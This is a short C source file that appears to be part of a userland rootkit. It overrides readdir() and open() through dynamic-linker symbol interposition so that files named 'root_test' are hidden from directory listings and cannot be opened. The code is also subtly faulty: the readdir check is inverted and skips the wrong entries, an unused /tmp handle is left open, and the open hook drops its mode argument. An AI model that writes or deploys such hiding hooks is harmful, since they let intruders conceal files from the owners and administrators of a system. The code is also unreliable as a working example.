#define _GNU_SOURCE
#include<stdio.h>
#include<unistd.h>
#include<dirent.h>
#include<fcntl.h>
#include<dlfcn.h>
#include<string.h>
#include"rkconstant.h"


//hide directories entries 
struct dirent *readdir(DIR *dirp){
    struct dirent *(*my_readdir)(DIR *dirp);
    my_readdir =dlsym(RTLD_NEXT,"readdir");

    DIR *check_dir = opendir("/tmp");
    if(!my_readdir)
        return NULL;

    struct dirent *entry;
    entry = my_readdir(dirp);
    if(entry !=NULL && strcmp(entry->d_name,"root_test")){
        entry=my_readdir(dirp);
    }
    return entry;


}
//hide all names
int open(const char *pathname, int flags, ...){
    int (*my_open)(const char *pathname, int flags, ...);
    my_open = dlsym(RTLD_NEXT,"open");

    //hide file named root_test
    if(strstr(pathname,"root_test")){
        return -1;
    }
    return my_open(pathname,flags);
}

